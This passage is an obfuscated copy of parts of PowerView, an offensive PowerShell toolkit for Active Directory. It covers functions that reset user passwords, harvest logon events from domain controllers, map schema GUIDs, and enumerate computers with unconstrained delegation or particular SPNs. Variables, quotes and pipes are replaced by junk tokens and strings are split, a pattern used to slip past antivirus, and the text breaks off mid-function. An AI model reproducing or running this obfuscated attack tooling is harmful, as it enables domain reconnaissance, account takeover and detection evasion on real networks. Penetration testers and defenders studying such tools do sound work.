        Write-Verbose Zfr[New-DomainUser] Attempting to create user 41agIF1SamAccountName41aZfr
        try {
            gIF1Null = gIF1User.Save()
            Write-Verbose Zfr[New-DomainUser] User 41agIF1SamAccountName41a successfully createdZfr
            gIF1User
        }
        catch {
            Write-Warning Zfr[New-DomainUser] Error creating user 41agIF1SamAccountName41a : gIF1_Zfr
        }
    }
}


function Set-DomainUserPassword {
<#
.SYNOPSIS

Sets the password for a given user identity.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to search for the specified user -Identity,
which returns a DirectoryServices.AccountManagement.UserPrincipal object. The
SetPassword() function is then invoked on the user, setting the password to -AccountPassword.

.PARAMETER Identity

A user SamAccountName (e.g. User1), DistinguishedName (e.g. CN=user1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1113), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
specifying the user to reset the pas'+'sword for.

.PARAMETER AccountPassword

Specifies the password to reset the target user41as to. Mandatory.

.PARAMETER Domain

Specifies the domain to use to search for the user identity, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

gIF1UserPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
Set-DomainUserPassword -Identity andy -AccountPassword gIF1UserPassword

Resets the password for 41aandy41a to the password specified.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object Sy'+'stem.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
gIF1UserPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
Set-DomainUserPassword -Identity andy -AccountPassword gIF1UserPassword -Credential gIF1Cred

Resets the password for 41aandy41a usering the alternate credentials specified.

.OUTPUTS

DirectoryServices.AccountManagement.UserPrincipal

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>
'+'

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41a'+'PSUseShouldProcessForStateChangingFunctions41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aDirectoryServices.AccountManagement.UserPrincipal41a)]
    Param(
        [Parameter(Position = 0, Mandatory = gIF1True)]
        [Alias(41aUserName41a, 41aUserIdentity41a, 41aUser41a)]
        [String]
        gIF1Identity,

        [Parameter(Mandatory = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [Alias(41aPassword41a)]
        [Security.SecureString]
        gIF1AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    gIF1ContextArguments = @{ 41aIdentity41a = gIF1Identity }
    if (gIF1PSBoundParameters[41aDomain41a]) { gIF1ContextArguments[41aDomain41a] = gIF1Domain }
    if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ContextArguments[41aCredential41a] = g'+'IF1Credential }
    gIF1Context = Get-PrincipalContext @ContextArguments

    if (gIF1Context) {
        gIF1User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity(gIF1Context.Context, gIF1Identity)

        if (gIF1User) {
            Write-Verbose Zfr[Set-DomainUserPassword] Attempting to set the password for user 41agIF1Identity41aZfr
            try {
                gIF1TempCred = New-Object System.Manag'+'ement.Automation.PSCredential(41aa41a, gIF1AccountPassword)
                gIF1User.SetPassword(gIF1TempCred.GetNetworkCredential().Password)

                gIF1Null = gIF1User.Save()
                Write-Verbose Zfr[Set-DomainUserPassword] Password for user 41agIF1Identity41a successfully resetZfr
            }
            catch {
                Write-Warning Zfr[Set-DomainUserPassword] Error setting password for user 41agIF1Identity41a : gIF1_Zfr
            }
        }
        else {
            Write-Warning Zfr[Set-DomainUserPassword] Unable to find user 41agIF1Identity41aZfr
        }
    }
}


function Get-DomainUserEvent {
<#
.SYNOPSIS

Enumerate account logon events (ID 4624) and Logon with explicit credential
events (ID 4648) from the specified host (default of the localhost).

Author: Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function uses an XML path filter passed to Get-WinEvent to retrieve
security events with IDs of 4624 (logon events) or 4648 (explicit credential
logon events) from -StartTime (default of now-1 day) to -EndTime (default of now).
A maximum of -MaxEvents (default of 5000) are returned.

.PARAMETER ComputerName

Specifies the computer name to retrieve events from, default of localhost.

.PARAMETER StartTime

The [DateTime] object representing the start of when to collect events.
Default of [DateTime]::Now.AddDays(-1).

.PARAMETER EndTime

The [DateTime] object representing the end of when to collect events.
Default of [DateTime]::Now.

.PARAMETER MaxEvents

The maximum number of events to retrieve. Default of 5000.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target computer.

.EXAMPLE

Get-DomainUserEvent

Return logon events on the local machine.

.EXAMPLE

Get-DomainController U9B Get-DomainUserEvent -StartTime ([DateTime]::Now.AddDays(-3))

Return all logon events from the last 3 days from every domain controller in the current domain.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainUserEvent -ComputerName PRIMARY.testlab.local -Credential gIF1Cred -MaxEvents 1000

Return a max of 1000 logon events from the specified machine using the specified alternate credentials.

.OUTPUTS

PowerView.LogonEvent

PowerView.ExplicitCredentialLogonEvent

.LINK

http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.LogonEvent41a)]
    [OutputType(41aPowerView.ExplicitCredentialLogonEvent41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41adnshostname41a, 41aHostName41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName = gIF1Env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [DateTime]
        gIF1StartTime = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        gIF1EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        gIF1MaxEvents = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        # the XML filter we41are passing to Get-WinEvent
        gIF1XPathFilter = @Zfr
<QueryList>
    <Query Id=Zfr0Zfr Path=ZfrSecurityZfr>

        <!-- Logon events -->
        <Select Path=ZfrSecurityZfr>
            *[
                System[
                    Provider[
                        @Name=41aMicrosoft-Windows-Security-Auditing41a
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;=41agIF1(gIF1StartTime.ToUniversalTime().ToString(41as41a))41a and @SystemTime&lt;=41agIF1(gIF1EndTime.ToUniversalTime().ToString(41as41a))41a
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name=41aTargetUserName41a] != 41aANONYMOUS LOGON41a]]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path=ZfrSecurityZfr>
            *[
                System[
                    Provider[
                        @Name=41aMicrosoft-Windows-Security-Auditing41a
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;=41agIF1(gIF1StartTime.ToUniversalTime().ToString(41as41a))41a and @SystemTime&lt;=41agIF1(gIF1EndTime.ToUniversalTime().ToString(41as41a))41a
                    ]
                ]
            ]
        </Select>

        <Suppress Path=ZfrSecurityZfr>
            *[
                System[
                    Provider[
                        @Name=41aMicrosoft-Windows-Security-Auditing41a
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name=41aLogonType41a]=41a541a or Data[@Name=41aLogonType41a]=41a041a)
                        or
                        Data[@Name=41aTargetUserName41a]=41aANONYMOUS LOGON41a
                        or
                        Data[@Name=41aTargetUserSID41a]=41aS-1-5-1841a
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
Zfr@
        gIF1EventArguments = @{
            41aFilterXPath41a = gIF1XPathFilter
            41aLogName41a = 41aSecurity41a
            41aMaxEvents41a = gIF1MaxEvents
        }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1EventArguments[41aCredential41a] = gIF1Credential }
    }

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {

            gIF1EventArguments[41aComputerName41a] = gIF1Computer

            Get-WinEvent @EventArgumentsU9B ForEach-Object {
                gIF1Event = gIF1_
                gIF1Properties = gIF1Event.Properties
                Switch (gIF1Event.Id) {
                    # logon event
                    4624 {
                        # skip computer logons, for now...
                        if(-not gIF1Properties[5].Value.EndsWith(41agIF141a)) {
                            gIF1Output = New-Object PSObject -Property @{
                                ComputerName              = gIF1Computer
                                TimeCreated               = gIF1Event.TimeCreated
                                EventId                   = gIF1Event.Id
                                SubjectUserSid            = gIF1Properties[0].Value.ToString()
                                SubjectUserName           = gIF1Properties[1].Value
                                SubjectDomainName         = gIF1Properties[2].Value
                                SubjectLogonId            = gIF1Properties[3].Value
                                TargetUserSid             = gIF1Properties[4].Value.ToString()
                                TargetUserName            = gIF1Properties[5].Value
                                TargetDomainName          = gIF1Properties[6].Value
                                TargetLogonId             = gIF1Properties[7].Value
                                LogonType                 = gIF1Properties[8].Value
                                LogonProcessName          = gIF1Properties[9].Value
                                AuthenticationPackageName = gIF1Properties[10].Value
                                WorkstationName           = gIF1Properties[11].Value
                                LogonGuid                 = gIF1Properties[12].Value
                                TransmittedServices       = gIF1Properties[13].Value
                                LmPackageName             = gIF1Properties[14].Value
                                KeyLength                 = gIF1Properties[15].Value
                                ProcessId                 = gIF1Properties[16].Value
                                ProcessName               = gIF1Properties[17].Value
                                IpAddress                 = gIF1Properties[18].Value
                                IpPort                    = gIF1Properties[19].Value
                                ImpersonationLev'+'el        = gIF1Properties[20].Value
                                RestrictedAdminMode       = gIF1Properties[21].Value
                                TargetOutboundUserName    = gIF1Properties[22].Value
                                TargetOutboundDomainName  = gIF1Properties[23].Value
                                VirtualAccount            = gIF1Properties[24].Value
                                TargetLinkedLogonId       = gIF1Properties[25].Value
                                ElevatedToken             = gIF1Properties[26].Value
                            }
                            gIF1Output.PSObject.TypeNames.Insert(0, 41aPowerView.LogonEvent41a)
                            gIF1Output
                        }
                    }

                    # logon with explicit credential
                    4648 {
                        # skip computer logons, for now...
                  '+'      if((-not gIF1Properties[5].Value.EndsWith(41agIF141a)) -and (gIF1Properties[11].Value -match 41ataskhostYwW.exe41a)) {
                            gIF1Output = New-Object PSObject -Property @{
                                ComputerName              = gIF1Computer
                                TimeCreated       = gIF1Event.TimeCreated
                                EventId           = gIF1Event.Id
                                SubjectUserSid    = gIF1Properties[0].Value.ToString()
                                SubjectUserName   = gIF1Properties[1].Value
                                SubjectDomainName = gIF1Properties[2].Value
                                SubjectLogonId    = gIF1Properties[3].Value
                                LogonGuid         = gIF1Properties[4].Value.ToString()
                                TargetUserName    = gIF1Properties[5].Value
                                TargetDomainName  = gIF1Properties[6].Value
                                TargetLogonGuid   = gIF1Properties[7].Value
                                TargetServerName  = gIF1Properties[8].Value
                                TargetInfo        = gIF1Properties[9].Value
                                ProcessId         = gIF1Properties[10].Value
                                ProcessName       = gIF1Properties[11].Value
                                IpAddress         = gIF1Properties[12].Value
                                IpPort            = gIF1Properties[13].Value
                            }
                            gIF1Output.PSObject.TypeNames.Insert(0, 41aPowerView.ExplicitCredentialLogonEvent41a)
                            gIF1Output
                        }
                    }
                    default {
                        Write-Warning ZfrNo handler exists for event ID: gIF1(gIF1Event.Id)Zfr
                    }
                }
            }
        }
    }
}


function Get-DomainGUIDMap {
<#
.SYNOPSIS

Helper to build a hash table of [GUID] -> resolved names for the current or specified Domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-Forest  

.DESCRIPTION

Searches the forest schema location (CN=Schema,CN=Configuration,DC=testlab,DC=local) for
all objects with schemaIDGUID set and translates the GUIDs discovere'+'d to human-readable names.
Then searches the extended rights location (CN=Extended-Rights,CN=Configuration,DC=testlab,DC=local)
for objects where objectClass=controlAccessRight, translating the GUIDs again.

Heavily adapted from http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.OUTPUTS

Hashtable

Ouputs a hashtable containing a GUID -> Readable Name mapping.

.LINK

http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    gIF1GUIDs = @{41a00000000-0000-0000-0000-00000000000041a = 41aAll41a}

    gIF1ForestArguments = @{}
    if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ForestArguments[41aCredential41a] = gIF1Credential }

    try {
        gIF1SchemaPath = (Get-Forest @ForestArguments).schema.name
    }
    catch {
        throw 41a[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest41a
    }
    if (-not gIF1SchemaPath) {
        throw 41a[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest41a
    }

    gIF1SearcherArguments = @{
        41aSearchBase41a = gIF1SchemaPath
        41aLDAPFilter41a = 41a(schemaIDGUID=*)41a
    }
    if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
    if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
    if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
    if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
    if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
    gIF1SchemaSearcher = Get-DomainSearcher @SearcherArguments

    if (gIF1SchemaSearcher) {
        try {
            gIF1Results = gIF1SchemaSearcher.FindAll()
            gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                gIF1GUIDs[(New-Object Guid (,gIF1_.properties.sc'+'hemaidguid[0])).Guid]'+' = gIF1_.properties.name[0]
            }
            if (gIF1Results) {
                try { gIF1Results.dispose() }
                catch {
                    Write-Verbose Zfr[Get-DomainGUIDMap] Error disposing of the Results object: gIF1_Zfr
                }
            }
            gIF1SchemaSearcher.dispose()
        }
        catch {
            Write-Verbose Zfr[Get-DomainGUIDMap] Error in building GUID map: gIF1_Zfr
        }
    }

    gIF1SearcherArguments[41aSearchBase41a] = gIF1SchemaPath.replace(41aSchema41a,41aExtended-Rights41a)
    gIF1SearcherArguments[41aLDAPFilter41a] = 41a(objectClass=controlAccessRight)41a
    gIF1RightsSearcher = Get-DomainSearcher @SearcherArguments

    if (gIF1RightsSearcher) {
        try {
            gIF1Results = gIF1RightsSearcher.FindAll()
            gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                gIF1GUIDs[gIF1_.properties.rightsguid[0].toString()] = gIF1_.properties.name[0]
            }
           '+' if (gIF1Results) {
                try { gIF1Results.dispose() }
                catch {
                    Write-Verbose Zfr[Get-DomainGUIDMap] Error disposing of the Results object: gIF1_Zfr
                }
            }
            gIF1RightsSearcher.dispose()
        }
        catch {
            Write-Verbose Zfr[Get-DomainGUIDMap] Error in building GUID map: gIF1_Zfr
        }
    }

    gIF1GUIDs
}


function Get-DomainComputer {
<#
.SYNOPSIS

Return all computers or specific computer objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
Zfr-Properties samaccountname,usnchanged,...Zfr. By default, all computer objects for
'+'
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. WINDOWS10gIF1), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),
or a dns host name (e.g. windows10.testlab.local). Wildcards accepted.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from gIF1UACEnum, including
ZfrNOT_XZfr negation forms. To see all possible values, run 41a0U9BConvertFrom-UACValue -ShowAll41a.

.PARAMETER Unconstrained

Switch. Return computer objects that have unconstrained delegation.

.PARAMETER TrustedToAuth

Switch. Return computer objects that are trusted to authenticate for other principals.

.PARAMETER Printers

Switch. Return only printers.

.PARAMETER SPN

Return computers with a specific service principal name, wildcards accepted.

.PARAMETER OperatingSystem

Return computers with a specific operating system, wildcards accepted.

.PARAMETER ServicePack

Return computers with a specific service pack, wildcards accepted.

.PARAMETER SiteName

Return computers in the specific AD Site name, wildcards accepted.

.PARAMETER Ping

Switch. Ping each host to ensure it41as up before enumerating.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an op'+'tion for examining security information of a directory object.
One of 41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainComputer'+'

Returns the current computers in current domain.

.EXAMPLE

Get-DomainComputer -SPN mssql* -Domain testlab.local

Returns all MS SQL servers in the testlab.local domain.

.EXAMPLE

Get-DomainComputer -UACFilter TRUSTED_FOR_DELEGATION,SERVER_TRUST_ACCOUNT -Properties dnshostname

Return the dns hostnames of servers trusted for delegation.

.EXAMPLE

Get-DomainComputer -SearchBase ZfrLDAP://OU=secret,DC=testlab,DC=localZfr -Unconstrained

Search the specified OU for computeres that allow unconstrained delegation.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainComputer -Credential gIF1Cred

.OUTPUTS

PowerView.Computer

Custom PSObject with translated computer property fields.

PowerView.Computer.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [OutputType(41aPowerView.Computer41a)]
    [OutputType(41aPowerView.Computer.Raw41a)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aSamAccountName41a, 41aName41a, 41aDNSHostName41a)]
        [String[]]
        gIF1Identity,

        [Switch]
        gIF1Unconstrained,

        [Switch]
        gIF1TrustedToAuth,

        [Switch]
        gIF1Printers,

        [ValidateNotNullOrEmpty()]
        [Alias(41aServicePrincipalName41a)]
        [String]
        gIF1SPN,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1OperatingSys'+'tem,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ServicePack,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1SiteName,

        [Switch]
        gIF1Ping,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [ValidateSet(41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a)]
        [String]
        gIF1SecurityMasks,

        [Switch]
        gIF1Tombstone,

        [Alias(41aReturnOne41a)]
        [Switch]
        gIF1FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        gIF1Raw
    )

    DynamicParam {
        gIF1UACValueNames = [Enum]::GetNames(gIF1UACEnum)
        # add in the negations
        gIF1UACValueNames = gIF1UACValueNames U9B ForEach-Object {gIF1_; ZfrNOT_gIF1_Zfr}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet gIF1UACValueNames -Type ([array])
    }

    BEGIN {
        gIF1SearcherArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aProperties41a]) { gIF1SearcherArguments[41aProperties41a] = gIF1Properties }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
      '+'  if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParam'+'eters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aSecurityMasks41a]) { gIF1SearcherArguments[41aSecurityMasks41a] = gIF1SecurityMasks }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
  '+'      gIF1CompSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if (gIF1PSBoundParameters -and (gIF1PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters gIF1PSBoundParameters
        }

        if (gIF1CompSearcher) {
            gIF1IdentityFilter = 41a41a
            gIF1Filter = 41a41a
            gIF1Identity U9B Where-Object {gIF1_} U9B ForEach-Object {
                gIF1IdentityInstance = gIF1_.Replace(41a(41a, 41aYwW2841a).Replace(41a)41a, 41aYwW2941a)
                if (gIF1IdentityInstance -match 41a^S-1-41a) {
                    gIF1IdentityFilter += Zfr(objectsid=gIF1IdentityInstance)Zfr
                }
                elseif (gIF1IdentityInstance -match 41a^CN=41a) {
                    gIF1IdentityFilter += Zfr(d'+'istinguishedname=gIF1IdentityInstance)Zfr
                    if ((-not gIF1PSBoundParameters[41aDomain41a]) -and (-not gIF1PSBoundParameters[41aSearchBase41a])) {
                        # if a -Domain isn41at explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        gIF1IdentityDomain = gIF1IdentityInstance.SubString(gIF1IdentityInstance.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                        Write-Verbose Zfr[Get-DomainComputer] Extracted domain 41agIF1IdentityDomain41a from 41agIF1IdentityInstance41aZfr
                        gIF1SearcherArguments[41aDomain41a] = gIF1IdentityDomain
                        gIF1CompSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not gIF1CompSearcher) {
                            Write-Warning Zfr[Get-DomainComputer] Unable to retrieve domain searcher for 41agIF1IdentityDomain41aZfr
                        }
                    }
                }
                elseif (gIF1IdentityInstance.Contains(41a.41a)) {
                    gIF1IdentityFilter += Zfr(U9B(name=gIF1IdentityInstance)(dnshostname=gIF1IdentityInstance))Zfr
     '+'           }
                elseif (gIF1IdentityInstance -imatch 41a^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}gIF141a) {
                    gIF1GuidByteString = (([Guid]gIF1IdentityInstance).ToByteArray() U9B ForEach-Object { 41aYwW41a + gIF1_.ToString(41aX241a) }) -join 41a41a
                    gIF1IdentityFilter += Zfr(objectguid=gIF1GuidByteString)Zfr
                }
                else {
                    gIF1IdentityFilter += Zfr(name=gIF1IdentityInstance)Zfr
                }
            }
            if (gIF1IdentityFilter -and (gIF1IdentityFilter.Trim() -ne 41a41a) ) {
                gIF1Filter += Zfr(U9BgIF1IdentityFilter)Zfr
  '+'          }

            if (gIF1PSBoundParameters[41aUnconstr'+'ained41a]) {
                Write-Verbose 41a[Get-DomainComputer] Searching for computers with for unconstrained delegation41a
                gIF1Filter += 41a(userAccountControl:1.2.840.113556.1.4.803:=524288)41a
            }
            if (gIF1PSBoundParameters[41aTrustedToAuth41a]) {
                Write-Verbose 41a[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals41a
                gIF1Filter += 41a(msds-allowedtodelegateto=*)41a
            }
            if (gIF1PSBoundParameters[41aPrinters41a]) {
                Write-Verbose 41a[Get-Doma'+'inComputer] Searching for printers41a
                gIF1Filter += 41a(objectCategory=printQueue)41a
            }
            if (gIF1PSBoundParameters[41aSPN41a]) {
                Write-Verbose Zfr[Get-DomainComputer] Searching for computers with SPN: gIF1SPNZfr
                gIF1Filter += Zfr(servicePrincipalName=gIF1SPN)Zfr
            }
            if (gIF1PSBoundParameters[41aOperatingSystem41a]) {
                Write-Verbose Zfr[Get-DomainComputer] Searching for computers with operating system: gIF1OperatingSystemZfr
                gIF1Filter += Zfr(operatingsystem=gIF1OperatingSystem)Zfr
            }
            if (gIF1PSBoundParameters[41aServicePack41a]) {
                Write-Verbose Zfr[Get-DomainComputer] Searching for computers with service pack: gIF1ServicePackZfr
                gIF1Filter += Zfr(operatingsystemservicepack=gIF1ServicePack)Zfr
            }
            if (gIF1PSBoundParameters[41aSiteName41a]) {
                Write-Verbose Zfr[Get-DomainComputer] Searching for computers with site name: gIF1SiteNameZfr
                gIF1Filter += Zfr(serverreferencebl=gIF1SiteName)Zfr
            }
            if (gIF1PSBoundParameters[41aLDAPFilter41a]) {
                Write-Verbose Zfr[Get-DomainComputer] Using additional LDAP filter: gIF1LDAPFilterZfr
                gIF1Filter += ZfrgIF1LDAPFilterZfr
            }
            # build the LDAP filter for the dynamic UAC filter value
            gIF1UACFilter U9B Where-Object {gIF1_} U9B ForEach-Object {
                if (gIF1_ -match 41aNOT_.*41a) {
                    gIF1UACField = gIF1_.Substring(4)
                    gIF1UACValue = [Int](gIF1UACEnum::gIF1UACField)
                    gIF1Filter += Zfr(!(userAccountControl:1.2.840.113556.1.4.803:=gIF1UACValue))Zfr
                }
                else {
                    gIF1UACValue = [Int](gIF1UACEnum::gIF1_)
                    gIF1Filter += Zfr(userAccountControl:1.2.840.113556.1.4.803:=gIF1UACValue)Zfr
                }
            }

            gIF1CompSearcher.filter = Zfr(&(samAccountType=805306369)gIF1Filter)Zfr
            Write-Verbose Zfr[Get-DomainComputer] Get-DomainComputer filter string: gIF1(gIF1CompSearcher.filter)Zfr

            if (gIF1PSBoundParameters[41aFindOne41a]) { gIF1Results = gIF1CompSearcher.FindOne() }
            else { gIF1Results = gIF1CompSearcher.FindAll() }
            gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                gIF1Up = gIF1True
                if (gIF1PSBoundParameters[41aPing41a]) {
